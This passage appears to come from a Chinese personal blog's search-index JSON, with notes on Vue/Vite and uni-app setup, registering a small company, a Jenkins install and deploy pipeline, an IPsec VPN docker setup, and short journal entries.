name 的值 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:3:1","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#iconfont"},{"categories":["blog"],"content":" vite 相关资源 vite文档地址 GitHub - vbenjs/vite-plugin-svg-icons: Vite Plugin for fast creating SVG sprites. iconfonticonfont 是阿里的图标库. 这里介绍用法. 安装插件 pnpm install vite-plugin-svg-icons -D 配置 vite.config.ts import { createSvgIconsPlugin } from 'vite-plugin-svg-icons' import path from 'path' export default defineConfig({ plugins: [ // 关键内容 createSvgIconsPlugin({ iconDirs: [path.resolve(process.cwd(), 'src/assets/icons')], symbolId: 'icon-[dir]-[name]' }) ], }) 配置 main.ts // svg插件 import 'virtual:svg-icons-register' 创建文件夹 src/assets/icons, 去 iconfont 下载 svg 到这个文件夹. 例如 src/assets/icons/dollor.svg 使用方法: fill 控制颜色 样式控制大小 封装一下 src/components/SvgIcon/index.vue 组件 使用组件 import SvgIcon from \"@/components/SvgIcon/index.vue\"; env 环境变量vite 使用 .env 文件区分使用环境变量, 暴露在 import.meta.env 对象里. 已有的变量: import.meta.env.MODE: {string} 应用运行的 模式。 import.meta.env.BASE_URL: {string} 部署应用时候的基础 url, 默认 / import.meta.env.PROD: {boolean} 是否生产环境. NODE_ENV='production' 决定这个值 import.meta.env.DEV: {boolean} 是不是开发环境 import.meta.env.SSR: {boolean} 应用是否运行在 SSR 模式 使用场景 # \"dev\":\"vite\" 所以等同于直接执行 vite 命令 # 读取 .env.development pnpm dev # 等于并行运行 vue-tsc --build --force \u0026\u0026 vite build # 读取 .env.prodution pnpm build # 使用 --mode 指定读取的文件 .env.staging vite build --mode staging process.env.NODE_ENV 和 vite build --mode env 不是一个东西. 但是建议在 .env 文件里加入加上这个变量. 使得统一 # 示例如下 # .env VITE_APP_TITLE = '我是名字' # .env.development NODE_ENV = 'development' VITE_KEN = 'development' VITE_SERVER_URL = 'http://127.0.0.1:5000/' # .env.production NODE_ENV = 'production' VITE_KEN = 'production' VITE_SERVER_URL = 'http://127.0.0.1:5000/' 自定义组件名现在 可以这样指定名字 defineOptions({ name: 'Foo', // ... 更多自定义属性 }) 以前写 vue 的时候组件名会是文件名. 无法配置组件名称, 可以使用 vite-plugin-vue-setup-extend. import vueSetupExtend from 'vite-plugin-vue-setup-extend' export default defineConfig({ plugins: [ vue(), vueSetupExtend() // 加入 ], resolve: { alias: { '@': fileURLToPath(new URL('./src', import.meta.url)) } } }) 于是我们就可以像 xml 一样写 name 的值 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:3:1","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#env-环境变量"},{"categories":["blog"],"content":" vite 相关资源 vite文档地址 GitHub - vbenjs/vite-plugin-svg-icons: Vite Plugin for fast creating SVG sprites. iconfonticonfont 是阿里的图标库. 这里介绍用法. 安装插件 pnpm install vite-plugin-svg-icons -D 配置 vite.config.ts import { createSvgIconsPlugin } from 'vite-plugin-svg-icons' import path from 'path' export default defineConfig({ plugins: [ // 关键内容 createSvgIconsPlugin({ iconDirs: [path.resolve(process.cwd(), 'src/assets/icons')], symbolId: 'icon-[dir]-[name]' }) ], }) 配置 main.ts // svg插件 import 'virtual:svg-icons-register' 创建文件夹 src/assets/icons, 去 iconfont 下载 svg 到这个文件夹. 例如 src/assets/icons/dollor.svg 使用方法: fill 控制颜色 样式控制大小 封装一下 src/components/SvgIcon/index.vue 组件 使用组件 import SvgIcon from \"@/components/SvgIcon/index.vue\"; env 环境变量vite 使用 .env 文件区分使用环境变量, 暴露在 import.meta.env 对象里. 已有的变量: import.meta.env.MODE: {string} 应用运行的 模式。 import.meta.env.BASE_URL: {string} 部署应用时候的基础 url, 默认 / import.meta.env.PROD: {boolean} 是否生产环境. NODE_ENV='production' 决定这个值 import.meta.env.DEV: {boolean} 是不是开发环境 import.meta.env.SSR: {boolean} 应用是否运行在 SSR 模式 使用场景 # \"dev\":\"vite\" 所以等同于直接执行 vite 命令 # 读取 .env.development pnpm dev # 等于并行运行 vue-tsc --build --force \u0026\u0026 vite build # 读取 .env.prodution pnpm build # 使用 --mode 指定读取的文件 .env.staging vite build --mode staging process.env.NODE_ENV 和 vite build --mode env 不是一个东西. 但是建议在 .env 文件里加入加上这个变量. 使得统一 # 示例如下 # .env VITE_APP_TITLE = '我是名字' # .env.development NODE_ENV = 'development' VITE_KEN = 'development' VITE_SERVER_URL = 'http://127.0.0.1:5000/' # .env.production NODE_ENV = 'production' VITE_KEN = 'production' VITE_SERVER_URL = 'http://127.0.0.1:5000/' 自定义组件名现在 可以这样指定名字 defineOptions({ name: 'Foo', // ... 更多自定义属性 }) 以前写 vue 的时候组件名会是文件名. 无法配置组件名称, 可以使用 vite-plugin-vue-setup-extend. import vueSetupExtend from 'vite-plugin-vue-setup-extend' export default defineConfig({ plugins: [ vue(), vueSetupExtend() // 加入 ], resolve: { alias: { '@': fileURLToPath(new URL('./src', import.meta.url)) } } }) 于是我们就可以像 xml 一样写 name 的值 ","date":"2024-03-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/:3:1","series":null,"tags":["blog","vue","前端"],"title":"Vue手册","uri":"/posts/%E7%AC%94%E8%AE%B0/vue%E6%89%8B%E5%86%8C/#自定义组件名"},{"categories":["blog"],"content":" 简介记录一下开公司的由来，以及如何开公司。 ","date":"2024-03-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/:1:0","series":null,"tags":["blog"],"title":"开公司","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/#简介"},{"categories":["blog"],"content":" 要做的事情","date":"2024-03-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/:2:0","series":null,"tags":["blog"],"title":"开公司","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/#要做的事情"},{"categories":["blog"],"content":" 前提考虑 成本 先有想法，再去开。因为有成本 资金实缴。如果规定下来了，最低也要 10w？ 风险 有限责任公司可以保护到自己 税务 公司可以降低税。个人所得税最高 45% 业务 微信支付 上架 app 企业只和企业对接业务 成本不高，优势明显。 ","date":"2024-03-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/:2:1","series":null,"tags":["blog"],"title":"开公司","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/#前提考虑"},{"categories":["blog"],"content":" 办公司的流程很简单：网上提交资料，然后营业执照寄到家里。 具体来说有下面 3 个 工商登记 起名 不要有括号。全角半角问题！ 不要有生僻字。开发票说不清 经营范围和结尾有关系。例如计算机技术，结尾就是科技有限公司 登记 注册资本。可能要 10 w。低一点比较好，可以增资 经营范围。第一项很重要，是你的主营。做 app 就软件开发，做咨询就是技术咨询。其他的要搜一下小程序经营范围，然后搜一下 app 经营范围。加上去就行。以后再考虑互联网增值业务。可能要 ICP 证，这里要 100 w 注册资本。 经营地址 商用办公地址 刻章 公司章/公章 - 没别的字 财务章 法人章 - 方形，有法人名字 合同章 - 可以免掉，直接用公章 发票章？可能要 税务报道 发票账号 没什么业务。选小规模纳税人。100w 会自动升级一般纳税人 银行开户 ","date":"2024-03-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/:2:2","series":null,"tags":["blog"],"title":"开公司","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/#办公司的流程"},{"categories":["blog"],"content":" 云服务 阿里云个人账号，可以后期转企业账号 开通 阿里云CDT服务，有免费流量 vpc ，网段划分。统一 nat 出口。 1 个 公网ecs 跑起来。 域名解析 SLB 使用免费 CDT 流量作为入口。个人使用 ssh 连接 ecs 的公网 ip。禁用密码登录 自动化流水线 逐步迁移到 rds-mysql oss 文件存储 cdn 加速 redis 加速 nacos 配置中心 mq 日志，trace，metrics k8s ","date":"2024-03-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/:2:3","series":null,"tags":["blog"],"title":"开公司","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/#云服务"},{"categories":["blog"],"content":" 难点","date":"2024-03-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/:3:0","series":null,"tags":["blog"],"title":"开公司","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/#难点"},{"categories":["blog"],"content":" 规章制度 所以，只要想在国内上架，你得先注册一个公司 -\u003e 错误。华为、百度、阿里、酷安，我目前上了这 4 家，都是支持个人上传应用的 要做一个官网吧？你得先域名备案 -\u003e 正确。在线填表办理，比较简单 要开通在线支付？你得先 ICP 备案 -\u003e 错误。你说的可能是 ICP 许可证，ICP 备案和 ICP 许可证是两个东西，ICP 备案就是域名备案。另外你注册个个体工商户就能接入微信支付，不需要 ICP 许可证，而且 120 万年收入以内免税（增值税是全国统一免，个税部分地区免，不免个税的地区也在 2%以下，比公司税率低很多） 要申请 ICP 备案？你注册资金得至少 100 万 + 长期 3 人社保 -\u003e ICP 许可证是这个条件，但一般不需要办理。可以通过应用类型简单判断是否需要 ICP 许可证，工具类型的应用一般不需要提供 ICP 许可证，平台型的比如淘宝、微博这样的需要 要注册个 100 万的公司？新公司法要认缴改实缴了，好在附加了 5 年实缴到位的期限 -\u003e 5 年已经足够长，一般公司寿命也就 3 年左右，5 年快到了你可以减资或者注销，另外知识产权比如专利和软件著作权经评估后也可以用来实缴，评估花费 2000~3000 要上架个 APP ？你得先申请软著，然后再申请 APP 备案，最后提交审核，做好随时被打回的准备 -\u003e 正确。软著可以自己办，缺点是慢，2~3 个月，所以我现在都申请电子版权，2 周拿证，600 一个 ","date":"2024-03-01","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/:3:1","series":null,"tags":["blog"],"title":"开公司","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BC%80%E5%85%AC%E5%8F%B8/#规章制度"},{"categories":["journal"],"content":"2024-02-26 日记","date":"2024-02-26","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-26/","series":null,"tags":["journal"],"title":"2024-02-26","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-26/"},{"categories":["journal"],"content":"#fun/外面的世界 不可能移民美国？ Why Legal Immigration Is Impossible for Nearly Everyone | Cato at Liberty Blog ","date":"2024-02-26","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-26/:0:0","series":null,"tags":["journal"],"title":"2024-02-26","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-26/#"},{"categories":["journal"],"content":"2024-02-23 日记","date":"2024-02-23","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-23/","series":null,"tags":["journal"],"title":"2024-02-23","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-23/"},{"categories":["journal"],"content":"#lines 你可以逃避现实，但你无法逃避 \" 逃避现实 \" 的后果 所有人在一个泳池训练，按照水平分在四个泳道：A 道（游得最快的人）、B 道（次快）、C 道（次慢）和 D 道（最慢）。而 B 道的人是最不友善的。其他场景也是 B 类人最不友善。 ","date":"2024-02-23","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-23/:0:0","series":null,"tags":["journal"],"title":"2024-02-23","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-23/#"},{"categories":["journal"],"content":"2024-02-21 日记","date":"2024-02-21","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-21/","series":null,"tags":["journal"],"title":"2024-02-21","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-21/"},{"categories":["journal"],"content":"#fun 操作系统给应用程序擦屁股的事情不少见。 windows 检测是否有 360 进程，然后兼容 360 的 bug。苹果工具库为了监控微信，留下了一下 \" 屎山 \" 代码。 火绒安全为什么会删除Windows 文件资源管理器explorer.exe组件？ - 知乎 libmalloc/private/make_tapi_happy.h at libmalloc-474.0.13 · apple-oss-distributions/libmalloc · GitHub ","date":"2024-02-21","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-21/:0:0","series":null,"tags":["journal"],"title":"2024-02-21","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-21/#"},{"categories":["point"],"content":"这里记录我使用的镜像源配置 js镜像源 docker镜像源 换源工具，而且收录了各个源的地址 LinuxMirrors · 让换源更简单 - LinuxMirrors 我的 ken 工具也可以替换源。主要是 python 等等代码仓库的源 网络命令行工具-ken - 运维个人技术栈 ","date":"2024-02-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E9%95%9C%E5%83%8F%E6%BA%90/:0:0","series":null,"tags":["point","镜像源"],"title":"镜像源","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E9%95%9C%E5%83%8F%E6%BA%90/#"},{"categories":["journal"],"content":"2024-02-07 日记","date":"2024-02-07","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-07/","series":null,"tags":["journal"],"title":"2024-02-07","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-07/"},{"categories":["journal"],"content":"#fun 3d生物模型 ffish.asia / floraZia.com (@ffishAsia-and-floraZia) - Sketchfab ","date":"2024-02-07","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-07/:0:0","series":null,"tags":["journal"],"title":"2024-02-07","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-02-07/#"},{"categories":["blog"],"content":" 简介本来以为不会再使用 jenkins 了。但是遇到了这样的情况： 公司现在使用火山云 cicd，很烂，bug 多，很不好用 多种仓库结构 前后端在同一个仓库 后端多个微服务都在同一个仓库 小程序独立项目结构。多种构建命令，产出不同端，不同目录 前端独立仓库 gitlab-cicd 需要迁移代码到 gitlab。发版相关需要结合仓库的权限，分支的命名等。除非自己做二次开发 而 jenkins 这种久经沙场的万金油就不存在这些问题。 ","date":"2024-01-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog"],"title":"jenkins教程","uri":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 安装","date":"2024-01-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog"],"title":"jenkins教程","uri":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" 安装 jenkins # 安装jdk apt install openjdk-21-jdk -y 官网下载 war 包，配置守护进程 /etc/systemd/system/jenkins.service [Unit] Description=jenkins # 启动区间30s内,尝试启动3次 StartLimitIntervalSec=30 StartLimitBurst=3 [Service] # 环境变量 $MY_ENV1 # Environment=MY_ENV1=value1 # Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 # EnvironmentFile=/path/to/environment/file1 WorkingDirectory=/root ExecStart=/usr/bin/java -jar /root/jenkins.war # 总是间隔30s重启,配合StartLimitIntervalSec实现无限重启 RestartSec=30s Restart=always # 相关资源都发送term后,后发送kill KillMode=mixed # 最大文件打开数不限制 LimitNOFILE=infinity # 子线程数量不限制 TasksMax=infinity [Install] WantedBy=multi-user.target # Alias=testserver.service 启动 systemctl enable jenkins --now 因为国内的网络问题，启动大概率会有问题。 此时找到 /root/.jenkins/hudson.model.UpdateCenter.xml 文件，修改 url 为国内源 \u003c?xml version='1.1' encoding='UTF-8'?\u003e \u003csites\u003e \u003csite\u003e \u003cid\u003edefault\u003c/id\u003e \u003curl\u003ehttps://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json\u003c/url\u003e \u003c/site\u003e \u003c/sites\u003e 重启 systemctl restart jenkins ","date":"2024-01-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog"],"title":"jenkins教程","uri":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/#安装-jenkins"},{"categories":["blog"],"content":" 配置 nginx配置一个 nginx 反向代理 server { listen 80; server_name jenkins.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/jenkins.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name jenkins.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/jenkins.kentxxq.com.log k-json; # 普通header头,ip之类的 include /usr/local/nginx/conf/options/normal.conf; # 证书相关 include /usr/local/nginx/conf/options/ssl_kentxxq.conf; location / { proxy_pass http://172.16.0.58:8080; } } ","date":"2024-01-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog"],"title":"jenkins教程","uri":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/#配置-nginx"},{"categories":["blog"],"content":" 配置 jenkins 查看 /root/.jenkins/secrets/initialAdminPassword 拿到密码 安装插件，可能会有一些插件报错。这是因为我们的 jenkins 不是最新版本，而我们的插件源是最新的版本，我们晚点处理。继续做下面的步骤 在 admin管理界面 通常会有 升级jenkins的选项，升级然后重启 jenkins 再次检查插件是否有问题，有问题的话就更新或重装插件。 ","date":"2024-01-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog"],"title":"jenkins教程","uri":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/#配置-jenkins"},{"categories":["blog"],"content":" 使用","date":"2024-01-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog"],"title":"jenkins教程","uri":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/#使用"},{"categories":["blog"],"content":" 流水线示例 参数化构建过程, 字符参数 branch, 默认值 prod 配置流水线 pipeline{ agent any environment{ PRO_GROUP = 'prod' PROJECT = 'ooo' GIT_URL = \"https://git.kentxxq.com/xxx/ooo.git\" GIT_DIR = \"/opt/git/$PRO_GROUP/$PROJECT\" HOST='目标IP地址' JAVA_DIR=\"/app/$PROJECT\" JAVA_NAME = 'ooo.jar' PROT=9077 PKG_DIR = \"$GIT_DIR/ooo/target\" // SCRIPTS_FILE = \"$JAVA_DIR/app.sh restart $JAVA_NAME\" SCRIPTS_FILE = \"supervisorctl stop ooo ; supervisorctl start ooo\" } stages{ stage(' git pull'){ steps{ // \"*/${branch}\" 无法使用sha256发版 checkout([$class: 'GitSCM', branches: [[name: \"${env.branch}\"]], doGenerateSubmoduleConfigurations: false, extensions: [[$class: 'RelativeTargetDirectory', relativeTargetDir: \"$GIT_DIR\"]], submoduleCfg: [], userRemoteConfigs: [[credentialsId: 'gitlab_xiangqiang', url: \"$GIT_URL\"]]]) } } stage('mvn package'){ steps{ sh \"cd $GIT_DIR/ \u0026\u0026 mvn clean package -Pprod\" // sh \"cd $GIT_DIR/ \u0026\u0026 mvn clean install -U -Dmaven.test.skip=true -Ptest\" } } stage('scp java'){ steps{ sh \"ansible $HOST -m synchronize -a 'src=$PKG_DIR/$JAVA_NAME dest=$JAVA_DIR' \" // sh \"ansible $HOST2 -m synchronize -a 'src=$PKG_DIR/$JAVA_NAME dest=$JAVA_DIR' \" } } stage('restart java'){ steps{ sh \"ansible $HOST -m shell -a '$SCRIPTS_FILE'\" } } } } ","date":"2024-01-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog"],"title":"jenkins教程","uri":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/#流水线示例"},{"categories":["blog"],"content":" 参考资料 所有的内置变量 jenkins.chinnshi.com/env-vars.html/ Jenkins常用插件汇总以及简单介绍 | 二丫讲梵 mafeifan 的编程技术分享 | mafeifan 的编程技术分享 ","date":"2024-01-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["blog"],"title":"jenkins教程","uri":"/posts/%E7%AC%94%E8%AE%B0/jenkins%E6%95%99%E7%A8%8B/#参考资料"},{"categories":["blog"],"content":" 简介公司有一个敏感站点，限制了特定的 ip 访问。 可是过年在家，牛马还是要干活的。于是就需要一个可以可以鉴权的服务，进行请求的转发。 常见的就是使用 vpn 连接到某个公网服务器，然后服务器接管流量，转发到特定站点。 ","date":"2024-01-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/ipsec-vpn%E6%90%AD%E5%BB%BA/:1:0","series":null,"tags":["blog","tools"],"title":"ipsec-vpn搭建","uri":"/posts/%E7%AC%94%E8%AE%B0/ipsec-vpn%E6%90%AD%E5%BB%BA/#简介"},{"categories":["blog"],"content":" 安装这里使用 hwdsl2/setup-ipsec-vpn 来快速安装，docker安装文档在这里 # 搞一个配置文件 vim vpn.env # 预共享密钥 VPN_IPSEC_PSK=secret1111111111111 # vpn用户名 VPN_USER=username # vpn用户密码 VPN_PASSWORD=password # 运行 # 注意这里是 udp docker run \\ --name ipsec-vpn-server \\ --env-file ./vpn.env \\ --restart=always \\ -v ikev2-vpn-data:/etc/ipsec.d \\ -v /lib/modules:/lib/modules:ro \\ -p 500:500/udp \\ -p 4500:4500/udp \\ -d --privileged \\ hwdsl2/ipsec-vpn-server 接下来 配置各客户端。如果是安卓 12 以上，又不想下载第三方 App， 必须要配置标识符，所以只能使用IKEv2的方式连接，IKEv2 的证书获取方式如下 # 查看容器内的 /etc/ipsec.d 目录的文件 docker exec -it ipsec-vpn-server ls -l /etc/ipsec.d # 示例：将一个客户端配置文件从容器复制到 Docker 主机当前目录 docker cp ipsec-vpn-server:/etc/ipsec.d/vpnclient.p12 ./ ","date":"2024-01-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/ipsec-vpn%E6%90%AD%E5%BB%BA/:2:0","series":null,"tags":["blog","tools"],"title":"ipsec-vpn搭建","uri":"/posts/%E7%AC%94%E8%AE%B0/ipsec-vpn%E6%90%AD%E5%BB%BA/#安装"},{"categories":["journal"],"content":"2024-01-21 日记","date":"2024-01-21","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-01-21/","series":null,"tags":["journal"],"title":"2024-01-21","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-01-21/"},{"categories":["journal"],"content":"#fun 企鹅的卡通形象和现实形象都让人觉得它没有脖子。但是从骨骼来看，它有很长的脖子… 很多人会认为横线比竖线长。你可以弯下腰从胯下去看，会发现又不一样了 ","date":"2024-01-21","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-01-21/:0:0","series":null,"tags":["journal"],"title":"2024-01-21","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2024-01-21/#"},{"categories":["blog"],"content":" 简介记录 uni-app 的快速上手 ","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:1:0","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#简介"},{"categories":["blog"],"content":" 工具","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:2:0","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#工具"},{"categories":["blog"],"content":" 命令 创建项目 npx degit dcloudio/uni-preset-vue#vite-ts my-vue3-project 安装依赖 pnpm i 运行 pnpm dev:h5 如果是运行 mp-weixin，把 dist/dev/mp-weixin 导入微信开发者工具。就可以在微信开发者工具中预览 ","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:2:1","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#命令"},{"categories":["blog"],"content":" vscodevscode 插件 uni-create-view 帮助创建页面 uni-helper的组件包 帮助代码提示 uniapp小程序拓展 帮助悬停查看文档 ","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:2:2","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#vscode"},{"categories":["blog"],"content":" 类型提示安装类型 pnpm i -D @types/wechat-miniprogram @uni-helper/uni-app-types 配置 tsconfig.json。确保使用了 ts 类型，配置了 vueCompilerOptions 的 nativeTags 下面 4 个内容 { { \"types\": [\"@dcloudio/types\",\"@types/wechat-miniprogram\",\"@uni-helper/uni-app-types\"] }, \"vueCompilerOptions\": { \"nativeTags\": [\"block\", \"component\", \"template\", \"slot\"] } } ","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:2:3","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#类型提示"},{"categories":["blog"],"content":" 代码","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:3:0","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#代码"},{"categories":["blog"],"content":" 结构 manifest.json 存放 appid，应用名称，logo，版本 pages.json 注册页面 全局样式 tabbar 底部 pages 存放页面 static 存放静态资源 ","date":"2024-01-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:3:1","series":null,"tags":["blog","前端"],"title":"uni-app快速上手","uri":"/posts/%E7%AC%94%E8%AE%B0/uni-app%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/#结构"},{"categories":["blog"],"content":" 开发配置 UI 配置安装 uni-ui： pnpm i @dcloudio/uni-ui 安装 sass pnpm i sass -D 项目根路径添加 vue.config.js // vue.config.js module.exports = { transpileDependencies:['@dcloudio/uni-ui'] } 配置组件自动引入 // pages.json { \"easycom\": { \"autoscan\": true, \"custom\": { // uni-ui 规则如下配置 \"^uni-(.*)\": \"@dcloudio/uni-ui/lib/uni-$1/uni-$1.vue\" } }, \"pages\": [ // … ] } 配置 ts 类型：pnpm i -D @uni-helper/uni-ui-types // tsconfig.json { \"compilerOptions\": { \"types\": [ \"@dcloudio/types\", \"@types/wechat-miniprogram\", \"@uni-helper/uni-app-types\", + \"@uni-helper/uni-ui-types\" ] }, } 安全边距 // 拿到安全区域距离，单位是px // 比如自定义导航栏。在拿到top以后，给导航加上样式 :style=\"{ paddingTop: safeAreaInsets?.top + 'px' }\" const { safeAreaInsets } = uni.getSystemInfoSync() console.log(safeAreaInsets) 状态管理/持久化存储安装依赖 pnpm i pinia pinia-plugin-persistedstate 创建 src/stores/index.ts import { createPinia } from \"pinia\"; import persist from \"pinia-plugin-persistedstate\"; // 创建 pinia 实例 const pinia = createPinia(); // 使用持久化存储插件 pinia.use(persist); // 默认导出，给 main.ts 使用 export default pinia; // 模块统一导出 export * from \"./modules/user\"; 创建 src/stores/modules/user.ts, 保存用户信息的示例 import { defineStore } from \"pinia\"; import { ref } from \"vue\"; interface User { username: string; role: string; } // 定义 Store export const userStore = defineStore( \"user\", () =\u003e { // 用户信息 const user = ref\u003cUser\u003e(); // 保存用户信息 const setProfile = (val: User) =\u003e { user.value = val; }; // 清理用户信息，退出时使用 const clearProfile = () =\u003e { user.value = undefined; }; // 记得 return return { user, setProfile, clearProfile, }; }, // 持久化 { persist: { // 默认是localStorage，改成uni来兼容多端 storage: { setItem(key, value) { uni.setStorageSync(key, value); }, getItem(key) { return uni.getStorageSync(key); }, }, }, } ); main.ts 中引入使用 app.use(pinia); 